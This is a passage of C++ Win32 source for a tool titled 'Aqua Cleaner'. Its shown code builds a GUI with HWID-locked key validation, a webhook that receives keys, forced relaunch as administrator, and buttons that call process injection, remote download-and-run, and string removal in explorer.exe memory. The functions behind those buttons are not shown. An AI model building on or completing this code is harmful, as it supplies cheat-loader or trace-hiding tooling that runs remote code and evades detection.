                    150, 130, 80, 30,
                    hwnd, (HMENU)ID_BUTTON_GENERATE, NULL, NULL);

                CreateWindowW(L"BUTTON", L"Inject",
                    WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON | WS_DISABLED,
                    50, 30, 180, 30,
                    hwnd, (HMENU)ID_BUTTON_INJECT, NULL, NULL);

                CreateWindowW(L"BUTTON", L"Download & Run",
                    WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON | WS_DISABLED,
                    50, 70, 180, 30,
                    hwnd, (HMENU)ID_BUTTON_DOWNLOAD_RUN, NULL, NULL);

                CreateWindowW(L"BUTTON", L"Clean",
                    WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON | WS_DISABLED,
                    50, 170, 180, 30,
                    hwnd, (HMENU)ID_BUTTON_CLEAN, NULL, NULL);

                // New controls for memory manipulation
                CreateWindowW(L"STATIC", L"Process: explorer.exe",
                    WS_CHILD | WS_VISIBLE,
                    300, 30, 150, 20,
                    hwnd, NULL, NULL, NULL);

                hwndEditMemoryAddress = CreateWindowW(L"EDIT", L"",
                    WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL,
                    300, 60, 150, 20,
                    hwnd, (HMENU)ID_EDIT_MEMORY_ADDRESS, NULL, NULL);

                hwndEditLength = CreateWindowW(L"EDIT", L"",
                    WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL,
                    300, 90, 150, 20,
                    hwnd, (HMENU)ID_EDIT_LENGTH, NULL, NULL);

                hwndEditFilePath = CreateWindowW(L"EDIT", L"",
                    WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL,
                    300, 120, 250, 20,
                    hwnd, (HMENU)ID_EDIT_FILE_PATH, NULL, NULL);

                CreateWindowW(L"BUTTON", L"Load File",
                    WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON | WS_DISABLED,
                    300, 150, 100, 30,
                    hwnd, (HMENU)ID_BUTTON_LOAD_FILE, NULL, NULL);

                CreateWindowW(L"BUTTON", L"Remove String",
                    WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON | WS_DISABLED,
                    410, 150, 100, 30,
                    hwnd, (HMENU)ID_BUTTON_REMOVE_STRING, NULL, NULL);

                // Display HWID
                std::wstring hwid = GetHWID();
                std::wstring hwidMessage = L"Your HWID: " + hwid;
                MessageBoxW(hwnd, hwidMessage.c_str(), L"HWID Info", MB_OK | MB_ICONINFORMATION);
                break;
            }
            case WM_COMMAND:
                if (LOWORD(wParam) == ID_BUTTON_CLEAN) {
                    PerformFullCleanup(hwnd);
                }
                else if (LOWORD(wParam) == ID_BUTTON_VALIDATE) {
                    WCHAR keyBuffer[256];
                    GetWindowTextW(hwndEditKey, keyBuffer, 256);
                    std::wstring enteredKey = keyBuffer;

                    if (ValidateKey(enteredKey, GetHWID())) {
                        isValidated = true;
                        MessageBoxW(hwnd, L"Key validated successfully!", L"Success", MB_OK | MB_ICONINFORMATION);
                        EnableWindow(GetDlgItem(hwnd, ID_BUTTON_CLEAN), TRUE);
                        EnableWindow(GetDlgItem(hwnd, ID_BUTTON_DOWNLOAD_RUN), TRUE);
                        EnableWindow(GetDlgItem(hwnd, ID_BUTTON_INJECT), TRUE);
                        EnableWindow(GetDlgItem(hwnd, ID_BUTTON_LOAD_FILE), TRUE);
                        EnableWindow(GetDlgItem(hwnd, ID_BUTTON_REMOVE_STRING), TRUE);
                    }
                    else {
                        isValidated = false;
                        MessageBoxW(hwnd, L"Invalid key!", L"Error", MB_OK | MB_ICONERROR);
                    }
                }
                else if (LOWORD(wParam) == ID_BUTTON_GENERATE) {
                    std::wstring hwid = GetHWID();
                    std::wstring key = GenerateKey(hwid);
                    bool sent = SendToWebhook(key);
                    std::wstring message = sent ? L"Generated key sent to webhook: " + key : L"Failed to send key to webhook!";
                    MessageBoxW(hwnd, message.c_str(), sent ? L"Key Generated" : L"Error", MB_OK | (sent ? MB_ICONINFORMATION : MB_ICONERROR));
                }
                else if (LOWORD(wParam) == ID_BUTTON_DOWNLOAD_RUN) {
                    RunRemoteFile();
                }
                else if (LOWORD(wParam) == ID_BUTTON_INJECT) {
                    InjectFile();
                }
                else if (LOWORD(wParam) == ID_BUTTON_LOAD_FILE) {
                    LoadFile(hwnd, hwndEditMemoryAddress, hwndEditLength, hwndEditFilePath);
                }
                else if (LOWORD(wParam) == ID_BUTTON_REMOVE_STRING) {
                    RemoveString(hwnd, hwndEditMemoryAddress, hwndEditLength, hwndEditFilePath);
                }
                break;

            case WM_PAINT:
                if (backgroundImage) {
                    PAINTSTRUCT ps;
                    HDC hdc = BeginPaint(hwnd, &ps);
                    Gdiplus::Graphics graphics(hdc);
                    graphics.DrawImage(backgroundImage, 0, 0, 600, 300);
                    EndPaint(hwnd, &ps);
                    return 0;
                }
                break;

            case WM_DESTROY:
                delete backgroundImage;
                PostQuitMessage(0);
                break;
            }

            return DefWindowProcW(hwnd, uMsg, wParam, lParam);
        }

        int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int nCmdShow) {
            if (!IsRunningAsAdmin()) {
                RelaunchAsAdmin();
            }

            Gdiplus::GdiplusStartupInput gdiStartupInput;
            ULONG_PTR gdiToken;
            Gdiplus::Status status = Gdiplus::GdiplusStartup(&gdiToken, &gdiStartupInput, nullptr);
            if (status != Gdiplus::Ok) {
                MessageBoxW(NULL, L"GdiplusStartup failed!", L"Error", MB_OK | MB_ICONERROR);
                return 0;
            }

            backgroundImage = Gdiplus::Image::FromFile(L"image.png");
            if (backgroundImage && backgroundImage->GetLastStatus() != Gdiplus::Ok) {
                delete backgroundImage;
                backgroundImage = nullptr;
            }

            const wchar_t CLASS_NAME[] = L"MyWindowClass";
            WNDCLASSW wc = {};
            wc.lpfnWndProc = WindowProc;
            wc.hInstance = hInstance;
            wc.lpszClassName = CLASS_NAME;
            wc.hCursor = LoadCursor(NULL, IDC_ARROW);

            RegisterClassW(&wc);

            HWND hwnd = CreateWindowExW(0, CLASS_NAME, L"Aqua Cleaner",
                WS_OVERLAPPEDWINDOW ^ WS_THICKFRAME ^ WS_MAXIMIZEBOX,
                CW_USEDEFAULT, CW_USEDEFAULT, 600, 300,
                NULL, NULL, hInstance, NULL);

            if (hwnd == NULL) {
                Gdiplus::GdiplusShutdown(gdiToken);
                return 0;
            }

            ShowWindow(hwnd, nCmdShow);
            UpdateWindow(hwnd);

            MSG msg = {};
            while (GetMessageW(&msg, NULL, 0, 0)) {
                TranslateMessage(&msg);
                DispatchMessageW(&msg);
            }

            Gdiplus::GdiplusShutdown(gdiToken);
            return (int)msg.wParam;
        }
